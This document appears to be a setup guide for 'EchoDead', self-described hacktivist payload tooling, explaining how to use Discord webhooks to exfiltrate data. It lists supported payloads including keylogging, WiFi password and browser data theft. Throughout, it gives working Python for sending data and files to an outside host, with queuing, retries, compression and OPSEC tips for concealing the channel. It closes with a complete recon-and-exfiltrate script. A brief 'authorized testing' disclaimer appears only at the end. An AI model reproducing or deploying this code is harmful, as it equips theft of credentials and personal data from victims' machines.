# 🔗 Discord Webhook Setup Guide

**Complete guide to configuring Discord exfiltration for EchoDead payloads**

---

## 📋 Table of Contents

- [Overview](#overview)
- [Creating a Discord Webhook](#creating-a-discord-webhook)
- [Configuring EchoDead](#configuring-echodead)
- [Testing the Webhook](#testing-the-webhook)
- [Advanced Configuration](#advanced-configuration)
- [Security Considerations](#security-considerations)
- [Troubleshooting](#troubleshooting)
- [Rate Limits & Best Practices](#rate-limits--best-practices)

---

## 🎯 Overview

Discord webhooks allow EchoDead payloads to automatically send collected data to a Discord channel in real-time. This enables:

- **Real-time monitoring** of payload execution
- **Centralized data collection** across multiple operations
- **Immediate notifications** when payloads are triggered
- **Secure exfiltration** through Discord's encrypted channels
- **No server infrastructure** required

**Supported Payloads:**
- ✅ System information
- ✅ Network reconnaissance
- ✅ WiFi password extraction
- ✅ Screenshot capture
- ✅ File reconnaissance
- ✅ Clipboard monitoring
- ✅ Keystroke logging
- ✅ Browser data extraction
- ✅ Process monitoring
- ✅ All-in-one payload
- ✅ All new custom payloads

---

## 🛠️ Creating a Discord Webhook

### Method 1: Desktop App

1. **Open Discord** and navigate to the server where you want to receive data
2. **Right-click the channel** and select "Edit Channel"
3. Go to **"Integrations"** in the left sidebar
4. Click **"Webhooks"** → **"New Webhook"**
5. **Configure the webhook:**
   - **Name**: `EchoDead Exfil` (or any name you prefer)
   - **Channel**: Select the target channel
   - **Avatar**: Optional - upload an icon
6. Click **"Copy Webhook URL"**
7. Save this URL securely - anyone with this URL can post to your channel

**Example Webhook URL:**
```
https://discord.com/api/webhooks/1234567890123456789/AbCdEfGhIjKlMnOpQrStUvWxYz1234567890AbCdEfGhIjKlMnOpQrStUvWxYz1234
```

### Method 2: Mobile App

1. Open Discord app and navigate to your server
2. Tap the **server name** → **Settings**
3. Tap **"Integrations"**
4. Tap **"Webhooks"** → **"+"**
5. Configure and copy the webhook URL

### Method 3: Web Browser

1. Open Discord in browser ([discord.com/app](https://discord.com/app))
2. Navigate to Server Settings → Integrations → Webhooks
3. Create and configure webhook
4. Copy webhook URL

---

## 🔧 Configuring EchoDead

### Option 1: Configure webhook_utils.py (Recommended)

Edit `example_payloads/webhook_utils.py` and set your webhook URL:

```python
# Set your Discord webhook URL here
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
```

**All payloads will automatically use this webhook.**

#### Quick Setup:

```bash
# Edit webhook_utils.py
notepad example_payloads\webhook_utils.py

# Replace YOUR_DISCORD_WEBHOOK_URL_HERE with your actual webhook URL
# Save and close
```

### Option 2: Per-Payload Configuration

For payload-specific webhooks, edit individual payload files:

```python
#!/usr/bin/env python3
import sys
import os
sys.path.insert(0, os.path.dirname(__file__))

# Import webhook utility
from webhook_utils import send_to_discord

# Custom webhook for this payload only
CUSTOM_WEBHOOK = "https://discord.com/api/webhooks/ANOTHER_WEBHOOK_URL"

# Use custom webhook
send_to_discord("Title", data, webhook_url=CUSTOM_WEBHOOK)
```

### Option 3: Environment Variable (OPSEC-Friendly)

Set webhook URL as environment variable to avoid hardcoding:

**Windows (PowerShell):**
```powershell
$env:DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN"
```

**Linux/macOS:**
```bash
export DISCORD_WEBHOOK="https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN"
```

**Modify webhook_utils.py to use it:**
```python
import os
WEBHOOK_URL = os.environ.get('DISCORD_WEBHOOK', 'YOUR_DISCORD_WEBHOOK_URL_HERE')
```

---

## ✅ Testing the Webhook

### Quick Test Script

Create `test_webhook.py`:

```python
#!/usr/bin/env python3
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'example_payloads'))

from webhook_utils import send_to_discord

# Test data
test_data = {
    "Status": "✅ Webhook configured successfully!",
    "System": "Test System",
    "Time": "2026-03-22 14:30:00",
    "Message": "EchoDead is ready for deployment"
}

# Send test message
if send_to_discord("🧪 Webhook Test", test_data):
    print("✅ Webhook test successful! Check your Discord channel.")
else:
    print("❌ Webhook test failed. Check your URL configuration.")
```

**Run the test:**
```bash
python test_webhook.py
```

### Expected Discord Message

You should see a message in your Discord channel:

```
🧪 Webhook Test
Status: ✅ Webhook configured successfully!
System: Test System
Time: 2026-03-22 14:30:00
Message: EchoDead is ready for deployment

Steganography Tool • Today at 2:30 PM
```

---

## 🎛️ Advanced Configuration

### Custom Embed Formatting

Edit `webhook_utils.py` for custom Discord embeds:

```python
def send_to_discord(title, data, webhook_url=None, color=None, username=None, avatar_url=None):
    """Enhanced webhook with customization"""
    
    url = webhook_url or WEBHOOK_URL
    
    # Format data
    if isinstance(data, dict):
        data_str = "\n".join([f"**{k}:** {v}" for k, v in data.items()])
    else:
        data_str = str(data)
    
    # Custom colors
    colors = {
        'red': 15158332,
        'green': 3066993,
        'blue': 3447003,
        'yellow': 16776960,
        'purple': 10181046,
        'orange': 15105570,
    }
    
    embed_color = color or colors.get('red', 15158332)
    
    # Create enhanced embed
    payload = {
        "username": username or "EchoDead",
        "avatar_url": avatar_url or None,
        "embeds": [{
            "title": f"⚡ {title}",
            "description": data_str[:4000],
            "color": embed_color,
            "timestamp": datetime.utcnow().isoformat(),
            "footer": {
                "text": "EchoDead v2.0 - Hacktivist Collective",
                "icon_url": "https://i.imgur.com/your-icon.png"  # Optional
            },
            "thumbnail": {
                "url": "https://i.imgur.com/your-thumbnail.png"  # Optional
            }
        }]
    }
    
    # Send request
    req = urllib.request.Request(
        url,
        data=json.dumps(payload).encode('utf-8'),
        headers={'Content-Type': 'application/json'}
    )
    
    try:
        urllib.request.urlopen(req)
        return True
    except urllib.error.URLError as e:
        print(f"❌ Webhook error: {e}")
        return False
```

### Multiple Webhooks for Different Operations

```python
# webhook_utils.py configuration
WEBHOOKS = {
    'recon': 'https://discord.com/api/webhooks/RECON_WEBHOOK',
    'exfil': 'https://discord.com/api/webhooks/EXFIL_WEBHOOK',
    'persist': 'https://discord.com/api/webhooks/PERSIST_WEBHOOK',
    'test': 'https://discord.com/api/webhooks/TEST_WEBHOOK',
}

def send_to_discord(title, data, operation='recon'):
    """Send to operation-specific webhook"""
    webhook_url = WEBHOOKS.get(operation)
    # ... rest of function
```

### File Upload Support

```python
def send_file_to_discord(file_path, message="", webhook_url=None):
    """Upload files to Discord (screenshots, logs, etc.)"""
    import urllib.request
    import mimetypes
    
    url = webhook_url or WEBHOOK_URL
    
    # Prepare multipart form data
    boundary = f"----WebKitFormBoundary{os.urandom(8).hex()}"
    
    with open(file_path, 'rb') as f:
        file_data = f.read()
    
    filename = os.path.basename(file_path)
    content_type = mimetypes.guess_type(file_path)[0] or 'application/octet-stream'
    
    # Build multipart payload
    payload = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="content"\r\n\r\n'
        f'{message}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        f'Content-Type: {content_type}\r\n\r\n'
    ).encode('utf-8') + file_data + f"\r\n--{boundary}--\r\n".encode('utf-8')
    
    req = urllib.request.Request(
        url,
        data=payload,
        headers={'Content-Type': f'multipart/form-data; boundary={boundary}'}
    )
    
    try:
        urllib.request.urlopen(req)
        return True
    except Exception as e:
        print(f"❌ File upload error: {e}")
        return False
```

---

## 🔒 Security Considerations

### Webhook URL Protection

⚠️ **CRITICAL**: Your webhook URL is equivalent to a password!

**DO:**
- ✅ Store webhook URLs in environment variables
- ✅ Use `.gitignore` to exclude `webhook_utils.py` from version control
- ✅ Regenerate webhooks if accidentally exposed
- ✅ Use separate webhooks for testing vs operations
- ✅ Restrict Discord channel permissions

**DON'T:**
- ❌ Commit webhook URLs to public repositories
- ❌ Share webhook URLs in plain text
- ❌ Reuse webhooks across unrelated operations
- ❌ Leave test webhooks active

### .gitignore Configuration

Add to `.gitignore`:
```
# Discord webhook configuration
example_payloads/webhook_utils.py
test_webhook.py
**/webhook_config.json
```

### Webhook Rotation

Regenerate webhooks periodically:

1. Go to Discord → Integrations → Webhooks
2. Click your webhook
3. Click **"Delete Webhook"** (old)
4. Create new webhook
5. Update `webhook_utils.py`

### Encrypted Webhook Storage

```python
import base64
import os

# Store webhook as base64-encoded environment variable
def get_webhook():
    encoded = os.environ.get('WEBHOOK_B64')
    if encoded:
        return base64.b64decode(encoded).decode('utf-8')
    return "YOUR_DISCORD_WEBHOOK_URL_HERE"

WEBHOOK_URL = get_webhook()
```

**Set environment variable:**
```bash
# Encode webhook
echo -n "https://discord.com/api/webhooks/YOUR_URL" | base64

# Set as environment variable
export WEBHOOK_B64="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvWU9VUl9VUkw="
```

---

## 🐛 Troubleshooting

### Common Issues

#### 1. "Webhook URL not configured" Error

**Cause:** Default webhook URL not replaced in `webhook_utils.py`

**Solution:**
```bash
# Edit webhook_utils.py
notepad example_payloads\webhook_utils.py

# Replace line 12:
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
# With your actual webhook:
WEBHOOK_URL = "https://discord.com/api/webhooks/1234567890/YOUR_TOKEN"
```

#### 2. "401 Unauthorized" Error

**Cause:** Invalid webhook URL or webhook was deleted

**Solutions:**
- Verify webhook URL is correct (copy again from Discord)
- Check webhook still exists in Discord server
- Regenerate webhook if deleted

#### 3. "404 Not Found" Error

**Cause:** Webhook URL is malformed or channel was deleted

**Solutions:**
- Ensure URL starts with `https://discord.com/api/webhooks/`
- Verify channel still exists
- Create new webhook

#### 4. "429 Too Many Requests" Error

**Cause:** Rate limit exceeded (see below)

**Solutions:**
- Add delays between webhook calls
- Batch data into fewer messages
- Use message queuing

#### 5. No Message Appears in Discord

**Checklist:**
- ✅ Webhook URL copied correctly (no spaces/line breaks)
- ✅ Channel permissions allow webhook posts
- ✅ Discord server is online
- ✅ Payload actually executed (check local output)
- ✅ No firewall blocking outbound HTTPS connections

#### 6. "Import Error: No module named 'webhook_utils'"

**Cause:** Payload can't find webhook_utils.py

**Solution:**
```python
# Add to top of payload
import sys
import os
sys.path.insert(0, os.path.dirname(__file__))
from webhook_utils import send_to_discord
```

### Debug Mode

Enable verbose logging in `webhook_utils.py`:

```python
DEBUG = True  # Set to False for operations

def send_to_discord(title, data, webhook_url=None):
    url = webhook_url or WEBHOOK_URL
    
    if DEBUG:
        print(f"[DEBUG] Webhook URL: {url[:50]}...")
        print(f"[DEBUG] Title: {title}")
        print(f"[DEBUG] Data: {str(data)[:100]}...")
    
    # ... rest of function
    
    try:
        response = urllib.request.urlopen(req)
        if DEBUG:
            print(f"[DEBUG] Response: {response.status} {response.reason}")
        return True
    except urllib.error.URLError as e:
        if DEBUG:
            print(f"[DEBUG] Error details: {e.reason}")
        print(f"❌ Webhook error: {e}")
        return False
```

---

## ⏱️ Rate Limits & Best Practices

### Discord Rate Limits

| Limit Type | Threshold |
|-----------|-----------|
| Per Webhook | 30 requests per 60 seconds |
| Per Channel | 5 webhooks per 10 seconds |
| Per Server | 50 webhooks per 10 seconds |
| Message Size | 2000 characters (content) |
| Embed Description | 4096 characters |
| Total Embed | 6000 characters |

### Best Practices

#### 1. Batch Messages

Instead of sending 100 individual messages, combine data:

```python
# BAD: 100 webhook calls
for i in range(100):
    send_to_discord("Data", f"Item {i}")

# GOOD: 1 webhook call with batched data
batch_data = "\n".join([f"Item {i}" for i in range(100)])
send_to_discord("Batch Data", batch_data)
```

#### 2. Implement Rate Limiting

```python
import time
from datetime import datetime, timedelta

class RateLimiter:
    def __init__(self, max_calls=30, window=60):
        self.max_calls = max_calls
        self.window = window
        self.calls = []
    
    def wait_if_needed(self):
        now = datetime.now()
        # Remove calls outside window
        self.calls = [t for t in self.calls if now - t < timedelta(seconds=self.window)]
        
        if len(self.calls) >= self.max_calls:
            # Wait until oldest call expires
            wait_time = (self.calls[0] + timedelta(seconds=self.window) - now).total_seconds()
            print(f"⏱️  Rate limit reached. Waiting {wait_time:.1f}s...")
            time.sleep(wait_time + 1)
            self.calls = []
        
        self.calls.append(now)

# Usage
limiter = RateLimiter(max_calls=30, window=60)

for data in large_dataset:
    limiter.wait_if_needed()
    send_to_discord("Data", data)
```

#### 3. Compress Large Data

```python
import zlib
import base64

def send_large_data_compressed(title, large_data, webhook_url=None):
    """Send compressed data for large payloads"""
    
    # Compress data
    compressed = zlib.compress(large_data.encode('utf-8'))
    encoded = base64.b64encode(compressed).decode('utf-8')
    
    data = {
        "Type": "Compressed Data",
        "Original Size": f"{len(large_data)} bytes",
        "Compressed Size": f"{len(encoded)} bytes",
        "Compression Ratio": f"{len(large_data)/len(encoded):.2f}x",
        "Data": f"```{encoded[:3500]}```"  # Truncate for Discord
    }
    
    send_to_discord(title, data, webhook_url)
```

#### 4. Use Queuing for Reliability

```python
import queue
import threading
import time

webhook_queue = queue.Queue()

def webhook_worker():
    """Background thread to send webhooks"""
    while True:
        try:
            title, data, webhook_url = webhook_queue.get(timeout=1)
            send_to_discord(title, data, webhook_url)
            time.sleep(2)  # Rate limit: 30/min = ~2s per message
            webhook_queue.task_done()
        except queue.Empty:
            continue

# Start worker thread
thread = threading.Thread(target=webhook_worker, daemon=True)
thread.start()

# Queue messages (non-blocking)
def send_async(title, data, webhook_url=None):
    webhook_queue.put((title, data, webhook_url))
```

#### 5. Error Recovery

```python
def send_with_retry(title, data, webhook_url=None, max_retries=3):
    """Send with automatic retry on failure"""
    for attempt in range(max_retries):
        try:
            if send_to_discord(title, data, webhook_url):
                return True
            else:
                print(f"⚠️  Retry {attempt + 1}/{max_retries}")
                time.sleep(2 ** attempt)  # Exponential backoff
        except Exception as e:
            print(f"❌ Attempt {attempt + 1} failed: {e}")
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)
    
    print("❌ All retries exhausted")
    return False
```

---

## 📊 Monitoring & Analytics

### Track Webhook Success Rate

```python
class WebhookStats:
    def __init__(self):
        self.total = 0
        self.success = 0
        self.failures = 0
    
    def record(self, success):
        self.total += 1
        if success:
            self.success += 1
        else:
            self.failures += 1
    
    def get_stats(self):
        success_rate = (self.success / self.total * 100) if self.total > 0 else 0
        return {
            "Total Attempts": self.total,
            "Successful": self.success,
            "Failed": self.failures,
            "Success Rate": f"{success_rate:.1f}%"
        }

# Global stats tracker
webhook_stats = WebhookStats()

# Wrap send function
def send_tracked(title, data, webhook_url=None):
    result = send_to_discord(title, data, webhook_url)
    webhook_stats.record(result)
    return result
```

---

## 🎯 Example: Complete Payload with Webhook

```python
#!/usr/bin/env python3
"""
Example: System Reconnaissance with Discord Exfiltration
"""

import platform
import socket
import sys
import os
from datetime import datetime

# Add webhook utils to path
sys.path.insert(0, os.path.dirname(__file__))
from webhook_utils import send_to_discord

def gather_data():
    """Collect system information"""
    return {
        "Hostname": socket.gethostname(),
        "OS": f"{platform.system()} {platform.release()}",
        "User": os.getlogin(),
        "IP": socket.gethostbyname(socket.gethostname()),
        "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

def main():
    print("🔍 Gathering system information...")
    
    # Collect data
    data = gather_data()
    
    # Display locally
    print("\n📊 Collected Data:")
    for key, value in data.items():
        print(f"  {key}: {value}")
    
    # Exfiltrate to Discord
    print("\n📤 Sending to Discord...")
    if send_to_discord("System Recon Complete", data):
        print("✅ Data exfiltrated successfully!")
    else:
        print("❌ Exfiltration failed - check webhook configuration")

if __name__ == "__main__":
    main()
```

---

## 🔗 Resources

- [Discord Webhook Documentation](https://discord.com/developers/docs/resources/webhook)
- [Discord API Rate Limits](https://discord.com/developers/docs/topics/rate-limits)
- [EchoDead Payload Guide](PAYLOAD_GUIDE.md)
- [EchoDead Security Guide](SECURITY.md)

---

## ⚡ Quick Reference Card

```
┌─────────────────────────────────────────────────────────┐
│ DISCORD WEBHOOK SETUP - QUICK REFERENCE                │
├─────────────────────────────────────────────────────────┤
│                                                         │
│ 1. CREATE WEBHOOK                                       │
│    Discord → Server → Channel → Edit → Integrations    │
│    → Webhooks → New Webhook → Copy URL                 │
│                                                         │
│ 2. CONFIGURE ECHODEAD                                   │
│    Edit: example_payloads/webhook_utils.py             │
│    Set: WEBHOOK_URL = "https://discord.com/api/..."    │
│                                                         │
│ 3. TEST                                                 │
│    python test_webhook.py                              │
│                                                         │
│ 4. RATE LIMITS                                          │
│    30 requests per 60 seconds per webhook              │
│    Add 2s delays between messages                       │
│                                                         │
│ 5. SECURITY                                             │
│    Never commit webhook URLs to Git!                    │
│    Add webhook_utils.py to .gitignore                  │
│    Use environment variables for production             │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

**⚡ EchoDead v2.0 - Hacktivist-grade steganography for the resistance**

*For educational and authorized testing purposes only. Always obtain proper authorization.*
